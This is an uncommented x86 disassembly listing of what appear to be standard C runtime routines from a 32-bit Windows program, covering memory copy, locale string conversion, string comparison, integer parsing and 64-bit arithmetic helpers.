  426b54:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426b58:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426b5c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426b60:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426b64:	lea    eax,[ecx*4+0x0]
  426b6b:	add    esi,eax
  426b6d:	add    edi,eax
  426b6f:	jmp    DWORD PTR [edx*4+0x426b78]
  426b76:	mov    edi,edi
  426b78:	mov    BYTE PTR [ebx+0x42],ch
  426b7b:	add    BYTE PTR [eax-0x5fffbd95],dl
  426b81:	imul   eax,DWORD PTR [edx+0x0],0xffffffb4
  426b85:	imul   eax,DWORD PTR [edx+0x0],0xffffff8b
  426b89:	inc    ebp
  426b8a:	or     BYTE PTR [esi+0x5f],bl
  426b8d:	leave  
  426b8e:	ret    
  426b8f:	nop
  426b90:	mov    al,BYTE PTR [esi+0x3]
  426b93:	mov    BYTE PTR [edi+0x3],al
  426b96:	mov    eax,DWORD PTR [ebp+0x8]
  426b99:	pop    esi
  426b9a:	pop    edi
  426b9b:	leave  
  426b9c:	ret    
  426b9d:	lea    ecx,[ecx+0x0]
  426ba0:	mov    al,BYTE PTR [esi+0x3]
  426ba3:	mov    BYTE PTR [edi+0x3],al
  426ba6:	mov    al,BYTE PTR [esi+0x2]
  426ba9:	mov    BYTE PTR [edi+0x2],al
  426bac:	mov    eax,DWORD PTR [ebp+0x8]
  426baf:	pop    esi
  426bb0:	pop    edi
  426bb1:	leave  
  426bb2:	ret    
  426bb3:	nop
  426bb4:	mov    al,BYTE PTR [esi+0x3]
  426bb7:	mov    BYTE PTR [edi+0x3],al
  426bba:	mov    al,BYTE PTR [esi+0x2]
  426bbd:	mov    BYTE PTR [edi+0x2],al
  426bc0:	mov    al,BYTE PTR [esi+0x1]
  426bc3:	mov    BYTE PTR [edi+0x1],al
  426bc6:	mov    eax,DWORD PTR [ebp+0x8]
  426bc9:	pop    esi
  426bca:	pop    edi
  426bcb:	leave  
  426bcc:	ret    
  426bcd:	push   ebp
  426bce:	mov    ebp,esp
  426bd0:	sub    esp,0xc
  426bd3:	mov    eax,ds:0x4646c0
  426bd8:	xor    eax,DWORD PTR [ebp+0x4]
  426bdb:	and    BYTE PTR [ebp-0x6],0x0
  426bdf:	push   0x6
  426be1:	mov    DWORD PTR [ebp-0x4],eax
  426be4:	lea    eax,[ebp-0xc]
  426be7:	push   eax
  426be8:	push   0x1004
  426bed:	push   DWORD PTR [ebp+0x8]
  426bf0:	call   DWORD PTR ds:0x42811c
  426bf6:	test   eax,eax
  426bf8:	jne    0x426bff
  426bfa:	or     eax,0xffffffff
  426bfd:	jmp    0x426c09
  426bff:	lea    eax,[ebp-0xc]
  426c02:	push   eax
  426c03:	call   0x426f0e
  426c08:	pop    ecx
  426c09:	mov    ecx,DWORD PTR [ebp-0x4]
  426c0c:	xor    ecx,DWORD PTR [ebp+0x4]
  426c0f:	call   0x42401c
  426c14:	leave  
  426c15:	ret    
  426c16:	push   0x38
  426c18:	push   0x428f00
  426c1d:	call   0x423950
  426c22:	mov    eax,ds:0x4646c0
  426c27:	xor    eax,DWORD PTR [ebp+0x4]
  426c2a:	mov    DWORD PTR [ebp-0x1c],eax
  426c2d:	xor    edi,edi
  426c2f:	mov    DWORD PTR [ebp-0x20],edi
  426c32:	mov    DWORD PTR [ebp-0x24],edi
  426c35:	mov    eax,DWORD PTR [ebp+0x14]
  426c38:	mov    ebx,DWORD PTR [eax]
  426c3a:	mov    DWORD PTR [ebp-0x28],ebx
  426c3d:	mov    DWORD PTR [ebp-0x2c],edi
  426c40:	mov    eax,DWORD PTR [ebp+0x8]
  426c43:	cmp    eax,DWORD PTR [ebp+0xc]
  426c46:	je     0x426dbf
  426c4c:	lea    ecx,[ebp-0x40]
  426c4f:	push   ecx
  426c50:	push   eax
  426c51:	mov    esi,DWORD PTR ds:0x4280e0
  426c57:	call   esi
  426c59:	test   eax,eax
  426c5b:	je     0x426c7d
  426c5d:	cmp    DWORD PTR [ebp-0x40],0x1
  426c61:	jne    0x426c7d
  426c63:	lea    eax,[ebp-0x40]
  426c66:	push   eax
  426c67:	push   DWORD PTR [ebp+0xc]
  426c6a:	call   esi
  426c6c:	test   eax,eax
  426c6e:	je     0x426c7d
  426c70:	cmp    DWORD PTR [ebp-0x40],0x1
  426c74:	jne    0x426c7d
  426c76:	mov    DWORD PTR [ebp-0x2c],0x1
  426c7d:	cmp    DWORD PTR [ebp-0x2c],edi
  426c80:	je     0x426c9c
  426c82:	cmp    ebx,0xffffffff
  426c85:	je     0x426c8b
  426c87:	mov    esi,ebx
  426c89:	jmp    0x426c97
  426c8b:	push   DWORD PTR [ebp+0x10]
  426c8e:	call   0x423f60
  426c93:	pop    ecx
  426c94:	mov    esi,eax
  426c96:	inc    esi
  426c97:	mov    DWORD PTR [ebp-0x44],esi
  426c9a:	jmp    0x426c9f
  426c9c:	mov    esi,DWORD PTR [ebp-0x44]
  426c9f:	cmp    DWORD PTR [ebp-0x2c],edi
  426ca2:	jne    0x426cbe
  426ca4:	push   edi
  426ca5:	push   edi
  426ca6:	push   ebx
  426ca7:	push   DWORD PTR [ebp+0x10]
  426caa:	push   0x1
  426cac:	push   DWORD PTR [ebp+0x8]
  426caf:	call   DWORD PTR ds:0x42810c
  426cb5:	mov    esi,eax
  426cb7:	mov    DWORD PTR [ebp-0x44],esi
  426cba:	cmp    esi,edi
  426cbc:	je     0x426d16
  426cbe:	mov    DWORD PTR [ebp-0x4],edi
  426cc1:	lea    eax,[esi+esi*1]
  426cc4:	add    eax,0x3
  426cc7:	and    eax,0xfffffffc
  426cca:	call   0x4239a0
  426ccf:	mov    DWORD PTR [ebp-0x18],esp
  426cd2:	mov    ebx,esp
  426cd4:	mov    DWORD PTR [ebp-0x48],ebx
  426cd7:	lea    eax,[esi+esi*1]
  426cda:	push   eax
  426cdb:	push   edi
  426cdc:	push   ebx
  426cdd:	call   0x426250
  426ce2:	add    esp,0xc
  426ce5:	or     DWORD PTR [ebp-0x4],0xffffffff
  426ce9:	jmp    0x426d02
  426ceb:	xor    eax,eax
  426ced:	inc    eax
  426cee:	ret    
  426cef:	mov    esp,DWORD PTR [ebp-0x18]
  426cf2:	call   0x426de5
  426cf7:	xor    edi,edi
  426cf9:	xor    ebx,ebx
  426cfb:	or     DWORD PTR [ebp-0x4],0xffffffff
  426cff:	mov    esi,DWORD PTR [ebp-0x44]
  426d02:	cmp    ebx,edi
  426d04:	jne    0x426d24
  426d06:	push   esi
  426d07:	push   0x2
  426d09:	call   0x424a68
  426d0e:	pop    ecx
  426d0f:	pop    ecx
  426d10:	mov    ebx,eax
  426d12:	cmp    ebx,edi
  426d14:	jne    0x426d1d
  426d16:	xor    eax,eax
  426d18:	jmp    0x426dd1
  426d1d:	mov    DWORD PTR [ebp-0x24],0x1
  426d24:	push   esi
  426d25:	push   ebx
  426d26:	push   DWORD PTR [ebp-0x28]
  426d29:	push   DWORD PTR [ebp+0x10]
  426d2c:	push   0x1
  426d2e:	push   DWORD PTR [ebp+0x8]
  426d31:	call   DWORD PTR ds:0x42810c
  426d37:	test   eax,eax
  426d39:	je     0x426dc2
  426d3f:	cmp    DWORD PTR [ebp+0x18],edi
  426d42:	je     0x426d64
  426d44:	push   edi
  426d45:	push   edi
  426d46:	push   DWORD PTR [ebp+0x1c]
  426d49:	push   DWORD PTR [ebp+0x18]
  426d4c:	push   esi
  426d4d:	push   ebx
  426d4e:	push   edi
  426d4f:	push   DWORD PTR [ebp+0xc]
  426d52:	call   DWORD PTR ds:0x428090
  426d58:	test   eax,eax
  426d5a:	je     0x426dc2
  426d5c:	mov    eax,DWORD PTR [ebp+0x18]
  426d5f:	mov    DWORD PTR [ebp-0x20],eax
  426d62:	jmp    0x426dc2
  426d64:	cmp    DWORD PTR [ebp-0x2c],edi
  426d67:	jne    0x426d7f
  426d69:	push   edi
  426d6a:	push   edi
  426d6b:	push   edi
  426d6c:	push   edi
  426d6d:	push   esi
  426d6e:	push   ebx
  426d6f:	push   edi
  426d70:	push   DWORD PTR [ebp+0xc]
  426d73:	call   DWORD PTR ds:0x428090
  426d79:	mov    esi,eax
  426d7b:	cmp    esi,edi
  426d7d:	je     0x426dc2
  426d7f:	push   esi
  426d80:	push   0x1
  426d82:	call   0x424a68
  426d87:	pop    ecx
  426d88:	pop    ecx
  426d89:	mov    DWORD PTR [ebp-0x20],eax
  426d8c:	cmp    eax,edi
  426d8e:	je     0x426dc2
  426d90:	push   edi
  426d91:	push   edi
  426d92:	push   esi
  426d93:	push   eax
  426d94:	push   esi
  426d95:	push   ebx
  426d96:	push   edi
  426d97:	push   DWORD PTR [ebp+0xc]
  426d9a:	call   DWORD PTR ds:0x428090
  426da0:	cmp    eax,edi
  426da2:	jne    0x426db2
  426da4:	push   DWORD PTR [ebp-0x20]
  426da7:	call   0x42455a
  426dac:	pop    ecx
  426dad:	mov    DWORD PTR [ebp-0x20],edi
  426db0:	jmp    0x426dc2
  426db2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426db6:	je     0x426dc2
  426db8:	mov    ecx,DWORD PTR [ebp+0x14]
  426dbb:	mov    DWORD PTR [ecx],eax
  426dbd:	jmp    0x426dc2
  426dbf:	mov    ebx,DWORD PTR [ebp-0x48]
  426dc2:	cmp    DWORD PTR [ebp-0x24],edi
  426dc5:	je     0x426dce
  426dc7:	push   ebx
  426dc8:	call   0x42455a
  426dcd:	pop    ecx
  426dce:	mov    eax,DWORD PTR [ebp-0x20]
  426dd1:	lea    esp,[ebp-0x54]
  426dd4:	mov    ecx,DWORD PTR [ebp-0x1c]
  426dd7:	xor    ecx,DWORD PTR [ebp+0x4]
  426dda:	call   0x42401c
  426ddf:	call   0x42398b
  426de4:	ret    
  426de5:	push   ebp
  426de6:	mov    ebp,esp
  426de8:	sub    esp,0x48
  426deb:	push   ebx
  426dec:	push   esi
  426ded:	push   edi
  426dee:	push   0x4
  426df0:	pop    eax
  426df1:	call   0x4239a0
  426df6:	mov    ebx,esp
  426df8:	push   0x1c
  426dfa:	lea    eax,[ebp-0x24]
  426dfd:	push   eax
  426dfe:	push   ebx
  426dff:	call   DWORD PTR ds:0x42805c
  426e05:	test   eax,eax
  426e07:	je     0x426e7a
  426e09:	mov    edi,DWORD PTR [ebp-0x20]
  426e0c:	lea    eax,[ebp-0x48]
  426e0f:	push   eax
  426e10:	call   DWORD PTR ds:0x428128
  426e16:	mov    eax,DWORD PTR [ebp-0x44]
  426e19:	lea    esi,[eax-0x1]
  426e1c:	not    esi
  426e1e:	and    esi,ebx
  426e20:	sub    esi,eax
  426e22:	mov    DWORD PTR [ebp-0x4],eax
  426e25:	mov    eax,ds:0x464d64
  426e2a:	mov    ecx,eax
  426e2c:	dec    ecx
  426e2d:	neg    ecx
  426e2f:	sbb    ecx,ecx
  426e31:	and    ecx,0xffff1000
  426e37:	add    ecx,0x11000
  426e3d:	add    ecx,edi
  426e3f:	cmp    esi,ecx
  426e41:	jb     0x426e7a
  426e43:	cmp    eax,0x1
  426e46:	je     0x426e92
  426e48:	mov    ebx,edi
  426e4a:	mov    edi,0x1000
  426e4f:	push   0x1c
  426e51:	lea    eax,[ebp-0x24]
  426e54:	push   eax
  426e55:	push   ebx
  426e56:	call   DWORD PTR ds:0x42805c
  426e5c:	test   eax,eax
  426e5e:	je     0x426e7a
  426e60:	add    ebx,DWORD PTR [ebp-0x18]
  426e63:	test   DWORD PTR [ebp-0x14],edi
  426e66:	je     0x426e4f
  426e68:	test   BYTE PTR [ebp-0xf],0x1
  426e6c:	mov    ebx,DWORD PTR [ebp-0x24]
  426e6f:	je     0x426e76
  426e71:	xor    eax,eax
  426e73:	inc    eax
  426e74:	jmp    0x426eae
  426e76:	cmp    esi,ebx
  426e78:	jae    0x426e7e
  426e7a:	xor    eax,eax
  426e7c:	jmp    0x426eae
  426e7e:	push   0x4
  426e80:	push   edi
  426e81:	push   DWORD PTR [ebp-0x4]
  426e84:	push   ebx
  426e85:	call   DWORD PTR ds:0x4280ec
  426e8b:	mov    eax,ds:0x464d64
  426e90:	jmp    0x426e94
  426e92:	mov    ebx,esi
  426e94:	dec    eax
  426e95:	neg    eax
  426e97:	sbb    eax,eax
  426e99:	and    eax,0x103
  426e9e:	lea    ecx,[ebp-0x8]
  426ea1:	push   ecx
  426ea2:	inc    eax
  426ea3:	push   eax
  426ea4:	push   DWORD PTR [ebp-0x4]
  426ea7:	push   ebx
  426ea8:	call   DWORD PTR ds:0x428124
  426eae:	lea    esp,[ebp-0x54]
  426eb1:	pop    edi
  426eb2:	pop    esi
  426eb3:	pop    ebx
  426eb4:	leave  
  426eb5:	ret    
  426eb6:	int3   
  426eb7:	int3   
  426eb8:	int3   
  426eb9:	int3   
  426eba:	int3   
  426ebb:	int3   
  426ebc:	int3   
  426ebd:	int3   
  426ebe:	int3   
  426ebf:	int3   
  426ec0:	push   ebp
  426ec1:	mov    ebp,esp
  426ec3:	push   edi
  426ec4:	push   esi
  426ec5:	push   ebx
  426ec6:	mov    esi,DWORD PTR [ebp+0xc]
  426ec9:	mov    edi,DWORD PTR [ebp+0x8]
  426ecc:	mov    al,0xff
  426ece:	mov    edi,edi
  426ed0:	or     al,al
  426ed2:	je     0x426f06
  426ed4:	mov    al,BYTE PTR [esi]
  426ed6:	add    esi,0x1
  426ed9:	mov    ah,BYTE PTR [edi]
  426edb:	add    edi,0x1
  426ede:	cmp    ah,al
  426ee0:	je     0x426ed0
  426ee2:	sub    al,0x41
  426ee4:	cmp    al,0x1a
  426ee6:	sbb    cl,cl
  426ee8:	and    cl,0x20
  426eeb:	add    al,cl
  426eed:	add    al,0x41
  426eef:	xchg   al,ah
  426ef1:	sub    al,0x41
  426ef3:	cmp    al,0x1a
  426ef5:	sbb    cl,cl
  426ef7:	and    cl,0x20
  426efa:	add    al,cl
  426efc:	add    al,0x41
  426efe:	cmp    al,ah
  426f00:	je     0x426ed0
  426f02:	sbb    al,al
  426f04:	sbb    al,0xff
  426f06:	movsx  eax,al
  426f09:	pop    ebx
  426f0a:	pop    esi
  426f0b:	pop    edi
  426f0c:	leave  
  426f0d:	ret    
  426f0e:	push   esi
  426f0f:	push   edi
  426f10:	call   0x423803
  426f15:	mov    edi,DWORD PTR [eax+0x64]
  426f18:	cmp    edi,DWORD PTR ds:0x46481c
  426f1e:	je     0x426f27
  426f20:	call   0x424caf
  426f25:	mov    edi,eax
  426f27:	mov    esi,DWORD PTR [esp+0xc]
  426f2b:	cmp    DWORD PTR [edi+0x28],0x1
  426f2f:	movzx  eax,BYTE PTR [esi]
  426f32:	jle    0x426f42
  426f34:	push   0x8
  426f36:	push   eax
  426f37:	push   edi
  426f38:	call   0x426f96
  426f3d:	add    esp,0xc
  426f40:	jmp    0x426f4c
  426f42:	mov    ecx,DWORD PTR [edi+0x48]
  426f45:	movzx  eax,BYTE PTR [ecx+eax*2]
  426f49:	and    eax,0x8
  426f4c:	test   eax,eax
  426f4e:	je     0x426f53
  426f50:	inc    esi
  426f51:	jmp    0x426f2b
  426f53:	movzx  ecx,BYTE PTR [esi]
  426f56:	inc    esi
  426f57:	cmp    ecx,0x2d
  426f5a:	mov    edx,ecx
  426f5c:	je     0x426f63
  426f5e:	cmp    ecx,0x2b
  426f61:	jne    0x426f67
  426f63:	movzx  ecx,BYTE PTR [esi]
  426f66:	inc    esi
  426f67:	xor    eax,eax
  426f69:	cmp    ecx,0x30
  426f6c:	jl     0x426f78
  426f6e:	cmp    ecx,0x39
  426f71:	jg     0x426f78
  426f73:	sub    ecx,0x30
  426f76:	jmp    0x426f7b
  426f78:	or     ecx,0xffffffff
  426f7b:	cmp    ecx,0xffffffff
  426f7e:	je     0x426f8c
  426f80:	lea    eax,[eax+eax*4]
  426f83:	lea    eax,[ecx+eax*2]
  426f86:	movzx  ecx,BYTE PTR [esi]
  426f89:	inc    esi
  426f8a:	jmp    0x426f69
  426f8c:	cmp    edx,0x2d
  426f8f:	pop    edi
  426f90:	pop    esi
  426f91:	jne    0x426f95
  426f93:	neg    eax
  426f95:	ret    
  426f96:	push   ebp
  426f97:	mov    ebp,esp
  426f99:	push   ecx
  426f9a:	mov    eax,DWORD PTR [ebp+0xc]
  426f9d:	lea    ecx,[eax+0x1]
  426fa0:	cmp    ecx,0x100
  426fa6:	mov    ecx,DWORD PTR [ebp+0x8]
  426fa9:	ja     0x426fb4
  426fab:	mov    ecx,DWORD PTR [ecx+0x48]
  426fae:	movzx  eax,WORD PTR [ecx+eax*2]
  426fb2:	jmp    0x427008
  426fb4:	push   esi
  426fb5:	mov    edx,eax
  426fb7:	sar    edx,0x8
  426fba:	push   edi
  426fbb:	mov    edi,DWORD PTR [ecx+0x48]
  426fbe:	movzx  esi,dl
  426fc1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426fc6:	pop    edi
  426fc7:	pop    esi
  426fc8:	je     0x426fd9
  426fca:	and    BYTE PTR [ebp-0x2],0x0
  426fce:	push   0x2
  426fd0:	mov    BYTE PTR [ebp-0x3],al
  426fd3:	mov    BYTE PTR [ebp-0x4],dl
  426fd6:	pop    eax
  426fd7:	jmp    0x426fe3
  426fd9:	and    BYTE PTR [ebp-0x3],0x0
  426fdd:	mov    BYTE PTR [ebp-0x4],al
  426fe0:	xor    eax,eax
  426fe2:	inc    eax
  426fe3:	push   0x1
  426fe5:	push   DWORD PTR [ecx+0x14]
  426fe8:	push   DWORD PTR [ecx+0x4]
  426feb:	lea    ecx,[ebp+0xe]
  426fee:	push   ecx
  426fef:	push   eax
  426ff0:	lea    eax,[ebp-0x4]
  426ff3:	push   eax
  426ff4:	push   0x1
  426ff6:	call   0x426078
  426ffb:	add    esp,0x1c
  426ffe:	test   eax,eax
  427000:	jne    0x427004
  427002:	leave  
  427003:	ret    
  427004:	movzx  eax,WORD PTR [ebp+0xe]
  427008:	and    eax,DWORD PTR [ebp+0x10]
  42700b:	leave  
  42700c:	ret    
  42700d:	int3   
  42700e:	int3   
  42700f:	int3   
  427010:	mov    eax,DWORD PTR [esp+0x8]
  427014:	mov    ecx,DWORD PTR [esp+0x10]
  427018:	or     ecx,eax
  42701a:	mov    ecx,DWORD PTR [esp+0xc]
  42701e:	jne    0x427029
  427020:	mov    eax,DWORD PTR [esp+0x4]
  427024:	mul    ecx
  427026:	ret    0x10
  427029:	push   ebx
  42702a:	mul    ecx
  42702c:	mov    ebx,eax
  42702e:	mov    eax,DWORD PTR [esp+0x8]
  427032:	mul    DWORD PTR [esp+0x14]
  427036:	add    ebx,eax
  427038:	mov    eax,DWORD PTR [esp+0x8]
  42703c:	mul    ecx
  42703e:	add    edx,ebx
  427040:	pop    ebx
  427041:	ret    0x10
  427044:	int3   
  427045:	int3   
  427046:	int3   
  427047:	int3   
  427048:	int3   
  427049:	int3   
  42704a:	int3   
  42704b:	int3   
  42704c:	int3   
  42704d:	int3   
  42704e:	int3   
  42704f:	int3   
  427050:	push   ebp
  427051:	mov    ebp,esp
  427053:	push   edi
  427054:	push   esi
  427055:	push   ebx
  427056:	mov    ecx,DWORD PTR [ebp+0x10]
  427059:	or     ecx,ecx
  42705b:	je     0x4270aa
  42705d:	mov    esi,DWORD PTR [ebp+0x8]
  427060:	mov    edi,DWORD PTR [ebp+0xc]
  427063:	mov    bh,0x41
  427065:	mov    bl,0x5a
  427067:	mov    dh,0x20
  427069:	lea    ecx,[ecx+0x0]
  42706c:	mov    ah,BYTE PTR [esi]
  42706e:	or     ah,ah
  427070:	mov    al,BYTE PTR [edi]
  427072:	je     0x42709b
  427074:	or     al,al
  427076:	je     0x42709b
  427078:	add    esi,0x1
  42707b:	add    edi,0x1
  42707e:	cmp    ah,bh
  427080:	jb     0x427088
  427082:	cmp    ah,bl
  427084:	ja     0x427088
  427086:	add    ah,dh
  427088:	cmp    al,bh
  42708a:	jb     0x427092
  42708c:	cmp    al,bl
  42708e:	ja     0x427092
  427090:	add    al,dh
  427092:	cmp    ah,al
  427094:	jne    0x4270a1
  427096:	sub    ecx,0x1
  427099:	jne    0x42706c
  42709b:	xor    ecx,ecx
  42709d:	cmp    ah,al
  42709f:	je     0x4270aa
  4270a1:	mov    ecx,0xffffffff
  4270a6:	jb     0x4270aa
  4270a8:	neg    ecx
  4270aa:	mov    eax,ecx
  4270ac:	pop    ebx
  4270ad:	pop    esi
  4270ae:	pop    edi
  4270af:	leave  
  4270b0:	ret    
  4270b1:	int3   
  4270b2:	int3   
  4270b3:	int3   
  4270b4:	int3   
  4270b5:	int3   
  4270b6:	int3   
  4270b7:	int3   
  4270b8:	int3   
  4270b9:	int3   
  4270ba:	int3   
  4270bb:	int3   
  4270bc:	int3   
  4270bd:	int3   
  4270be:	int3   
  4270bf:	int3   
  4270c0:	push   esi
  4270c1:	mov    eax,DWORD PTR [esp+0x14]
  4270c5:	or     eax,eax
  4270c7:	jne    0x4270f1
  4270c9:	mov    ecx,DWORD PTR [esp+0x10]
  4270cd:	mov    eax,DWORD PTR [esp+0xc]
  4270d1:	xor    edx,edx
  4270d3:	div    ecx
  4270d5:	mov    ebx,eax
  4270d7:	mov    eax,DWORD PTR [esp+0x8]
  4270db:	div    ecx
  4270dd:	mov    esi,eax
  4270df:	mov    eax,ebx
  4270e1:	mul    DWORD PTR [esp+0x10]
  4270e5:	mov    ecx,eax
  4270e7:	mov    eax,esi
  4270e9:	mul    DWORD PTR [esp+0x10]
  4270ed:	add    edx,ecx
  4270ef:	jmp    0x427138
  4270f1:	mov    ecx,eax
  4270f3:	mov    ebx,DWORD PTR [esp+0x10]
  4270f7:	mov    edx,DWORD PTR [esp+0xc]
  4270fb:	mov    eax,DWORD PTR [esp+0x8]
  4270ff:	shr    ecx,1
  427101:	rcr    ebx,1
  427103:	shr    edx,1
  427105:	rcr    eax,1
  427107:	or     ecx,ecx
  427109:	jne    0x4270ff
  42710b:	div    ebx
  42710d:	mov    esi,eax
  42710f:	mul    DWORD PTR [esp+0x14]
  427113:	mov    ecx,eax
  427115:	mov    eax,DWORD PTR [esp+0x10]
  427119:	mul    esi
  42711b:	add    edx,ecx
  42711d:	jb     0x42712d
  42711f:	cmp    edx,DWORD PTR [esp+0xc]
  427123:	ja     0x42712d
  427125:	jb     0x427136
  427127:	cmp    eax,DWORD PTR [esp+0x8]
  42712b:	jbe    0x427136
  42712d:	dec    esi
  42712e:	sub    eax,DWORD PTR [esp+0x10]
  427132:	sbb    edx,DWORD PTR [esp+0x14]
  427136:	xor    ebx,ebx
  427138:	sub    eax,DWORD PTR [esp+0x8]
  42713c:	sbb    edx,DWORD PTR [esp+0xc]
  427140:	neg    edx
  427142:	neg    eax
  427144:	sbb    edx,0x0
  427147:	mov    ecx,edx
  427149:	mov    edx,ebx
  42714b:	mov    ebx,ecx
  42714d:	mov    ecx,eax
  42714f:	mov    eax,esi
  427151:	pop    esi
  427152:	ret    0x10
  427155:	int3   
  427156:	int3   
  427157:	int3   
  427158:	int3   
  427159:	int3   
  42715a:	int3   
  42715b:	int3   
  42715c:	int3   
  42715d:	int3   
  42715e:	int3   
  42715f:	int3   
  427160:	lea    eax,[edx-0x1]
  427163:	pop    ebx
  427164:	ret    
  427165:	lea    esp,[esp+0x0]
  42716c:	lea    esp,[esp+0x0]
  427170:	xor    eax,eax
  427172:	mov    al,BYTE PTR [esp+0x8]
  427176:	push   ebx
  427177:	mov    ebx,eax
  427179:	shl    eax,0x8
  42717c:	mov    edx,DWORD PTR [esp+0x8]
  427180:	test   edx,0x3
  427186:	je     0x42719d
  427188:	mov    cl,BYTE PTR [edx]
  42718a:	add    edx,0x1
  42718d:	cmp    cl,bl
  42718f:	je     0x427160
  427191:	test   cl,cl
  427193:	je     0x4271e6
  427195:	test   edx,0x3
  42719b:	jne    0x427188
  42719d:	or     ebx,eax
  42719f:	push   edi
  4271a0:	mov    eax,ebx
  4271a2:	shl    ebx,0x10
  4271a5:	push   esi
  4271a6:	or     ebx,eax
  4271a8:	mov    ecx,DWORD PTR [edx]
  4271aa:	mov    edi,0x7efefeff
  4271af:	mov    eax,ecx
  4271b1:	mov    esi,edi
  4271b3:	xor    ecx,ebx
  4271b5:	add    esi,eax
  4271b7:	add    edi,ecx
  4271b9:	xor    ecx,0xffffffff
  4271bc:	xor    eax,0xffffffff
  4271bf:	xor    ecx,edi
  4271c1:	xor    eax,esi
  4271c3:	add    edx,0x4
  4271c6:	and    ecx,0x81010100
  4271cc:	jne    0x4271ea
  4271ce:	and    eax,0x81010100
  4271d3:	je     0x4271a8
  4271d5:	and    eax,0x1010100
  4271da:	jne    0x4271e4
  4271dc:	and    esi,0x80000000
  4271e2:	jne    0x4271a8
  4271e4:	pop    esi
  4271e5:	pop    edi
  4271e6:	pop    ebx
  4271e7:	xor    eax,eax
  4271e9:	ret    
  4271ea:	mov    eax,DWORD PTR [edx-0x4]
  4271ed:	cmp    al,bl
  4271ef:	je     0x427227
  4271f1:	test   al,al
  4271f3:	je     0x4271e4
  4271f5:	cmp    ah,bl
  4271f7:	je     0x427220
  4271f9:	test   ah,ah
  4271fb:	je     0x4271e4
  4271fd:	shr    eax,0x10
  427200:	cmp    al,bl
  427202:	je     0x427219
  427204:	test   al,al
  427206:	je     0x4271e4
  427208:	cmp    ah,bl
  42720a:	je     0x427212
  42720c:	test   ah,ah
  42720e:	je     0x4271e4
  427210:	jmp    0x4271a8
  427212:	pop    esi
  427213:	pop    edi
  427214:	lea    eax,[edx-0x1]
  427217:	pop    ebx
  427218:	ret    
  427219:	lea    eax,[edx-0x2]
  42721c:	pop    esi
  42721d:	pop    edi
  42721e:	pop    ebx
  42721f:	ret    
  427220:	lea    eax,[edx-0x3]
  427223:	pop    esi
  427224:	pop    edi
  427225:	pop    ebx
  427226:	ret    
  427227:	lea    eax,[edx-0x4]
  42722a:	pop    esi
  42722b:	pop    edi
  42722c:	pop    ebx
  42722d:	ret    
  42722e:	jmp    DWORD PTR ds:0x428120
